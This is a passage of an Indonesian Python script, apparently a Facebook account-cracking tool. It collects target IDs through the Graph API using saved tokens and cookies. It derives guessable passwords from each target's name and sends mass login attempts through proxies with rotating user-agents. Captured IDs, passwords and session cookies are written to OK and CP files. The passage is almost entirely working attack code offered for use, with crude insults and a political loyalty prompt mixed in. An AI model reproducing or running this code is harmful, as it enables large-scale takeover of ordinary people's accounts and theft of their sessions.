	belakang = ['777','999','111','222','333','444','638','656','556','452','281','812','235','898','998','110','739','892','344','87','665','81','sumarna','dermawan','darmawan','dirgantara','wijayanto','wijayanti','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','372','882','9238','194','883','809','293','251','726','332','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','82','83','766','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655',',223','332','331','313','62','63','64','65','66','67','68','gaming','123','321','332','033','721','768','988','998','901','425','719','223','7789','0018','335','827','811','880','092','064','862','6672','82','91','21','23','31','45','54','677','882','98','890','728','112','221','236','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25']
	tengah = ['widianti','yuliyanti','yulianto','supomo','sapitri','rancaekek','yuliana','aprianti','aprilianti','andini','hasanah','karimah','halimah','salamin','farida','adinda','kurniasih','sulistiawati','nurkarimah','nurazizah','daniati','geulis','cantik','imut','gemoy','kece','indrawan','rachmatika','sugiarti','sugih','ferdiansyah','nuraropah','sagita','nuralisa','setiawati','ramayanti','soraya','badriah','sutomo','supardi','supriadi','suparman','solehah','kasep']
	global ok , cc
	nama = input(f'{P}[{H}?{P}] {U}nama target{N} : ')
	if ',' in str(nama):
		print(f'  ╰─▶[red] masukan nama, jangan kosong ')
		time.sleep(3);str(nama)
	doma = input(f'{P}[{H}?{P}]{U} domain (ex:@gmail.com){N} : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f'  ╰─▶[red]  masukkan domain dengan benar ')
		time.sleep(3);str(doma)
	jumlah = input(f'{P}[{H}?{P}] ╰─▶{U} total dump (max:10000){N} : ')
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(tengah))}',f'{str(rr(0,31))}',f'{str(rc(belakang))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		if len(dump)==999999:passwrd()
		sys.stdout.write(f"\r{P}[{H}±{P}] ╰─▶{U} berhasil mengumpulkan {asu}{len(id)} {U}email...{P}");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()
#-----------------[ CRACK MASSAL ]-----------------#
def massal2():
    try:
        token = open(".token.txt", "r").read()
        cok = open(".cok.txt", "r").read()
    except IOError:
        exit()
    try:
        kumpulkan = int(input(f">> {U}Mau Berapa Id?{N} : "))
    except ValueError:
        exit()
    if kumpulkan < 1 or kumpulkan > 1000:
        exit()
    ses = requests.Session()
    bilangan = 0
    for KOTG49H in range(kumpulkan):
        bilangan += 1
        Masukan = input(f">> {U}Masukkan Id Yang Ke {N}" + str(bilangan) + f" : ")
        uid.append(Masukan)
    for user in uid:
        try:
            head = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
            }
            if len(id) == 0:
                params = {"access_token": token, "fields": "friends"}
            else:
                params = {"access_token": token, "fields": "friends"}
            url = requests.get(
                "https://graph.facebook.com/{}".format(user),
                params=params,
                headers=head,
                cookies={"cookie": cok},
            ).json()
            for xr in url["friends"]["data"]:
                try:
                    woy = xr["id"] + "|" + xr["name"]
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
        print("{U2}Total Id Terkumpul{x} : " + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        exit()
    except (KeyError, IOError):
        exit()
#-----------------[ CRACK FILE ]-----------------#
def crack_file():
	try:vin = os.listdir('/sdcard/downloads/')
	except FileNotFoundError:
		print(' [+] [red]File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print(' [+] [red] Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DUMP-FILE/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'\n %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input(' [+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' [+] [red] Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/DUMP-FILE/'+geh,'r').read().splitlines()
		except:
			print(' [+] [red] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		setting()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	loading()
	clear()
	banner()
	print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
	print(f'[01] [white]Hasil [green]OK [white]Anda ')
	print(f'[02] [white]Hasil [yellow]CP [white]Anda ')
	kz = input(f' {H}╰─▶{B} ✶{N} {H} Pilih : ')
	if kz in ['02','2']:
		
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f' {H2}╰─▶{B2} ✶{N} [red] file tidak di temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f' {H2}╰─▶{B2} ✶{N} [red] anda tidak memiliki hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[0%s] %s {K}%s Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' Account'+x)
			geeh = input(f' {H}╰─▶{B} ✶{N} {H} Pilih : ')
			
			try:geh = lol[geeh]
			except KeyError:
				print(f' {H2}╰─▶{B2} ✶{N} [red] pilih yang benar...')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f' {H2}╰─▶{B2} ✶{N} [red] file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x} {h}╰─▶{x}{K}{cpkuni[0]}{P}│{K}{cpkuni[1]}')
				nocp +=1
			
			input(f'{x}[{m} Klik Enter Untuk Kembali Kemenu{x} ]')
			back()
	elif kz in ['01','1']:
		
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f' {H2}╰─▶{B2} ✶{N} [red] file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' {H2}╰─▶{B2} ✶{N} [red] anda tidak mempunyai fileOK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {H}%s Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {H} %s Account'%(cih,isi,(len(hem))))
			geeh = input(f' {H}╰─▶{B} ✶{N} {H} Pilih : ')
			
			try:geh = lol[geeh]
			except KeyError:
				print(f' {H2}╰─▶{B2} ✶{N} [red] pilih yang bener kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f' {H2}╰─▶{B2} ✶{N} [red] file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x} {h}╰─▶{x}{h}{cpkuni[0]}{P}│{H}{cpkuni[1]}{P}│{h}{cpkuni[2]}{x}')
				nocp +=1		
			input(f'{x}[{m} Klik Enter Untuk Kembali Kemenu{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f' {H2}╰─▶{B2} ✶{N} [red] pilih yang bener kontol ')
		back()
###----------[ CRACK MASSAL ]----------###
def massal():
	prints(nel(f'                         [bold blue]Massal Crack')) 
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'{H}╰─▶{B} ✶{N} {U}Mau Berapa ID ?{N} : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'{H}╰─▶{B} ✶{N} {U}ID Ke{N}  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{idt}'.format(user),params=params,headers=head,cookies=cookie).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print("[bold green]╰─▶ [bold purple]Total DUMP  :{asu} "+str(len(id))) 
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
###-----[ DUMP PUBLIK MASSAL ]-----###
def Dump_Massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n>>> pastikan id target tidak private/publik.")
		jum = int(input(f'>>> input jumlah target ? : '))
	except ValueError:
		print(f'>>> input salah ')
		exit()
	if jum<1 or jum>100:
		print(f'>>> gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f'>>> input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r>>> sedang mengumpulkan id, sukses mengumpulkan {len(id)} id...."),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f'  - koneksi sinyal tidak stabil ')
			exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print('')
		print(f'  - koneksi sinyal tidak stabil ')
		back()
###----------[ ATUR SBLUM KREK ]----------###
def setting():
	cetak(nel(f"                        [bold blue]login ID Crack", title=f"{asu}{len(id)}{M2} ID TELAH DIKUMPULKAN", style=f"bold purple"))
	print(f"{H2}╰─▶ {B2}01 [bold purple]Facebook ID {M2}Old\n")
	print(f"{H2}╰─▶ {B2}02 [bold purple]Facebook ID {K2}New\n")
	print(f"{H2}╰─▶ {B2}03 [bold purple]Facebook ID {H2}Random\n")
	hu = input(f'✶ ━━⫸{H} Input{N} : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua) 
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		prints(f'         {P}[red]Input Tidak Diketahui{P}')
		login_menu()
	prints(nel(f'                         [bold blue]login Method', style=f"bold purple")) 
	prints(f'{H2}╰─▶ {B2}01 [bold purple]Method free.facebook.com [green] Validate [white]\n')
	prints(f'{H2}╰─▶ {B2}02 [bold purple]Method m.facebook.com [green] Async [white]\n')
	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method graph.facebook.com [green] B-Api [white]\n')
	prints(f'{H2}╰─▶ {B2}04 [bold purple]Method www.messenger.com [green] Messenger [white]\n')
	hc = input(f'✶ ━━⫸ {H} Input{N} : ')
	if hc in ['1','01']:
		method.append('metod1')
	elif hc in ['2','02']:
		method.append('metod2')
	elif hc in ['3','03']:
		method.append('metod3')
	elif hc in ['4','04']:
	    method.append('metod4')
	else:
		method.append('metod1')
	prints(nel(f'                        [bold blue]Manual Password?', style=f"bold purple")) 
	pwplus=input(f'✶ ━━⫸ {H}Tambahkan Password Manual {N}{M}( Y/t ) {N}')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'>> {H}Masukan kata sandi tambahan contoh{N} : {M}bagong,ngentod {N} \n>> {H}Saran kata sandi daeraah Target Contoh{N} :{M} kalimantan,bandung,jonggol{N}')
		pwku=input(f'✶ ━━⫸ {H}Masukkan Password Tambahan {N}: ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	print("")
	prints(nel(f'                        [bold blue]Pilih Prabowo?', style=f"bold purple"))
	tai = input('✶ ━━⫸  Saya Janji Akan Pilih Prabowo ( Y/t ) ')
	if tai in ['t','T']:
		print(' [red]Harus Pilih prabowo Klo Ga Pilih Jangan Pke Scnya ')
		back()
	elif tai in ['y','ya','Ya','Y']:
		str(hc)
	else:
		print(' [red]Gausah pke scnya kontol klo ga pilih Prabowo ')
		str(tai)
	passwrd()
	input(f'[{x} Klik "{m}Enter{x}" Untuk Kembali Kemenu{x}]')
	pepek()

#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	clear()
	banner()
	print(nel(f'                !{H} PROSES CRACK SEDANG BERLANGSUNG{N} !'))
	print(nel(f'               !{H} ON/OFF MODE PESAWAT SEBELUM MULAI{N} !')) 
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'metod1' in method:
				pool.submit(validate1,idf,pwv)
			elif 'metod2' in method:
				pool.submit(_async_,uid,pwv)
			elif 'metod3' in method:
				pool.submit(_api_,uid,pwv)
			elif 'metod4' in method:
				pool.submit(_messenger_,uid,pwv)
			else:
				pool.submit(_validate_,uid,pwv)
	print(f'[•]{H2} OK : {H2}%s '%(ok))
	print(f'[•]{K2} CP : {K2}%s '%(cp))
#--------------------[ METODE VALIDATE ]-----------------#
def validate1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Validate V1[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=630498417018811&kid_directed_site=0&app_id=630498417018811&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D630498417018811%26redirect_uri%3Dhttps%253A%252F%252Fm.webtoons.com%252Foauth%252FfacebookCallback%26display%3Dpage%26scope%3Dpublic_profile%26state%3DO_iC009zvqUdI2kd%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9d0dd006-ce43-49c3-bc35-26ef7ba52b4f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.webtoons.com%2Foauth%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DO_iC009zvqUdI2kd%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,Kues={'Kue': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xdz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def validate2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Validate V2[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def validate3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Validate V3[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%